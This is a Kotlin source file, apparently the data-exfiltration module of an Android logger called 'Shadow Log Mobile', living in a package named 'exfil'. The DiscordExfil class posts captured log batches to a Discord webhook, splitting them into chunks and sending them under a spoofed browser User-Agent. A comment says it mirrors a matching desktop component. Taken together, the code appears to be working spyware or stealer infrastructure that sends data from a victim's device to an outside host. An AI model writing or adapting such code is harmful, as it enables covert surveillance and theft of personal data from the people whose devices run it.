package com.system.service.exfil

import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * Discord webhook exfiltration channel.
 * Sends log batches as code-block formatted messages.
 * Mirrors the desktop's syncDiscord() function.
 */
class DiscordExfil(private val webhookUrl: String) {

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .build()

    private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()

    /** Send a log batch to Discord. Returns true on success. */
    fun send(content: String): Boolean {
        if (webhookUrl.isBlank()) return false

        return try {
            // Discord has a 2000 char limit per message. Split if needed.
            val chunks = splitMessage(content, 1900)
            var allSent = true

            for (chunk in chunks) {
                val msg = "```\n$chunk\n```"
                val payload = JSONObject().put("content", msg)

                val request = Request.Builder()
                    .url(webhookUrl)
                    .header("Content-Type", "application/json")
                    .header("User-Agent", "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36")
                    .post(payload.toString().toRequestBody(JSON_MEDIA))
                    .build()

                val response = client.newCall(request).execute()
                if (!response.isSuccessful) {
                    allSent = false
                    response.close()
                    break
                }
                response.close()

                // Rate limit delay between messages
                if (chunks.size > 1) Thread.sleep(500)
            }
            allSent
        } catch (_: Exception) {
            false
        }
    }

    /** Send a test message to verify webhook connectivity. */
    fun sendTest(): Boolean {
        return try {
            val payload = JSONObject()
                .put("content", "🟢 **Shadow Log Mobile** Connectivity Test\n\n• **Status**: Operational\n• **Platform**: Android")

            val request = Request.Builder()
                .url(webhookUrl)
                .header("Content-Type", "application/json")
                .post(payload.toString().toRequestBody(JSON_MEDIA))
                .build()

            val response = client.newCall(request).execute()
            val success = response.isSuccessful
            response.close()
            success
        } catch (_: Exception) {
            false
        }
    }

    private fun splitMessage(s: String, maxLen: Int): List<String> {
        if (s.length <= maxLen) return listOf(s)
        val chunks = mutableListOf<String>()
        var remaining = s
        while (remaining.isNotEmpty()) {
            if (remaining.length <= maxLen) {
                chunks.add(remaining)
                break
            }
            var idx = remaining.lastIndexOf('\n', maxLen)
            if (idx <= 0) idx = maxLen
            chunks.add(remaining.substring(0, idx))
            remaining = remaining.substring(idx).trimStart('\n')
        }
        return chunks
    }
}
